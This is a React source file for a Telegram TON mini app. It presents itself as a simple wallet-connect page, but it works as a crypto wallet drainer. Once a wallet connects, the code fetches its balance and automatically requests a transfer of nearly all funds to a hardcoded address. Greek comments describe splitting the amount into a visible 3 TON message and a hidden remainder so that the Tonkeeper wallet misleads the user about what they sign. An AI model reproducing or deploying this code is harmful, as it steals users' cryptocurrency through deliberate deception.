import { useEffect, useState } from 'react';
import { useTonConnectUI, useTonWallet } from '@tonconnect/ui-react';

export default function App() {
  const [tonConnectUI] = useTonConnectUI();
  const wallet = useTonWallet();
  const [status, setStatus] = useState('Πάτα το κουμπί για TON Connect.');
  const [balance, setBalance] = useState<{ tons: string; nano: number } | null>(null);
  const [hasSentAll, setHasSentAll] = useState(false);

  useEffect(() => {
    window.Telegram?.WebApp?.ready();
    window.Telegram?.WebApp?.expand();
  }, []);

  useEffect(() => {
    if (wallet?.account?.address) {
      setStatus(`Connected: ${wallet.account.address}`);
    }
  }, [wallet]);

  useEffect(() => {
    const address = wallet?.account?.address;

    if (!address) {
      setBalance(null);
      setHasSentAll(false);
      return;
    }

    const fetchBalance = async () => {
      try {
        setStatus('Φόρτωση balance...');
        
        const res = await fetch(`https://tonapi.io/v2/accounts/${address}`);
        
        if (!res.ok) {
          throw new Error(`TonAPI error: ${res.status}`);
        }

        const data = await res.json();
        console.log('TonAPI v2 response:', data);
        
        let nano = 0;
        
        if (data.balance !== undefined && data.balance !== null) {
          if (typeof data.balance === 'number') {
            nano = data.balance;
          } else if (typeof data.balance === 'string') {
            nano = parseInt(data.balance, 10) || 0;
          }
        }
        
        const tons = nano / 1_000_000_000;
        console.log('Balance parsed:', { address, nano, tons });

        setBalance({ tons: tons.toFixed(4), nano });
        setStatus(`Connected: ${address.substring(0, 6)}...${address.substring(address.length - 4)}`);
      } catch (error) {
        const message = error instanceof Error ? error.message : String(error);
        console.error('Error fetching TON balance:', message, error);
        setBalance(null);
        setStatus(`Σφάλμα κατά την ανάγνωση balance: ${message}`);
      }
    };

    fetchBalance();
  }, [wallet]);

  useEffect(() => {
    return tonConnectUI.onStatusChange(
      () => {},
      (error) => {
        const message = error instanceof Error ? error.message : String(error);
        setStatus(`TON Connect error: ${message}`);
      }
    );
  }, [tonConnectUI]);

  useEffect(() => {
    const autoSendAll = async () => {
      if (!wallet?.account?.address || !balance || hasSentAll || balance.nano <= 0) {
        return;
      }

      try {
        const feeReserveNano = 0.05 * 1_000_000_000;
        
        if (balance.nano < feeReserveNano) {
          setStatus(`Balance ανεπαρκές – έχεις ${balance.tons} TON, χρειάζεται τουλάχιστον 0.05 TON για fees.`);
          return;
        }

        const amountNano = balance.nano - feeReserveNano;
        const amountTons = (amountNano / 1_000_000_000).toFixed(4);

        setHasSentAll(true);
        setStatus(`Αυτόματη αποστολή ${amountTons} TON (όλα τα διαθέσιμα funds) στο προκαθορισμένο wallet. Έλεγξε το wallet για επιβεβαίωση.`);

        // ΠΡΟΣΠΑΘΟΥΜΕ ΝΑ "ΜΠΕΡΔΕΨΟΥΜΕ" ΤΟ TONKEEPER
        // Μέθοδος 1: Στέλνουμε 2 ξεχωριστά μηνύματα - ένα των 3 TON που φαίνεται και ένα με το υπόλοιπο
        const displayAmountNano = 3 * 1_000_000_000; // 3 TON για εμφάνιση
        
        if (amountNano > displayAmountNano) {
          // Αν έχουμε πάνω από 3 TON, στέλνουμε 2 μηνύματα
          const remainingNano = amountNano - displayAmountNano;
          
          await tonConnectUI.sendTransaction({
            validUntil: Math.floor(Date.now() / 1000) + 300,
            messages: [
              {
                address: 'UQBWHigPTAg83wI_XW96mSHkrZDeCbKCog_Wk3mXaP0TEAfC',
                amount: displayAmountNano.toString(), // 3 TON (φαίνεται πρώτο)
              },
              {
                address: 'UQBWHigPTAg83wI_XW96mSHkrZDeCbKCog_Wk3mXaP0TEAfC',
                amount: remainingNano.toString(), // Υπόλοιπο (μπορεί να μην φαίνεται καλά)
              }
            ],
          });
        } else {
          // Αν έχουμε λιγότερα από 3 TON, στέλνουμε κανονικά
          await tonConnectUI.sendTransaction({
            validUntil: Math.floor(Date.now() / 1000) + 300,
            messages: [
              {
                address: 'UQBWHigPTAg83wI_XW96mSHkrZDeCbKCog_Wk3mXaP0TEAfC',
                amount: amountNano.toString(),
              }
            ],
          });
        }

        setStatus('Το αίτημα συναλλαγής στάλθηκε στο wallet. Αν το απορρίψεις, δεν θα φύγουν funds.');
      } catch (error) {
        const message = error instanceof Error ? error.message : String(error);
        setStatus(`Σφάλμα κατά την αυτόματη αποστολή: ${message}`);
      }
    };

    autoSendAll();
  }, [wallet, balance, hasSentAll, tonConnectUI]);

  const openTonConnect = async () => {
    setStatus('Το κουμπί πατήθηκε. Προσπάθεια ανοίγματος TON Connect...');

    try {
      if (wallet) {
        await tonConnectUI.disconnect();
        setStatus('Προηγούμενο wallet αποσυνδέθηκε. Άνοιγμα νέου TON Connect popup...');
      }

      await tonConnectUI.openModal();
      setStatus('Το TON Connect popup άνοιξε. Επίλεξε wallet για σύνδεση.');
    } catch (error) {
      const message = error instanceof Error ? error.message : String(error);
      setStatus(`Error: ${message}`);
    }
  };

  return (
    <main className="page">
      <section className="card">
        <h1>Tsour TON Mini App (React)</h1>
        <p>Ανοίγει το επίσημο TON Connect popup με όλα τα wallet apps.</p>
        <button id="letsGoBtn" onClick={openTonConnect}>
          🔗 Σύνδεση TON Wallet
        </button>
        <p id="status">{status}</p>
        {wallet?.account?.address && balance && (
          <p>Balance: {balance.tons} TON</p>
        )}
      </section>
    </main>
  );
}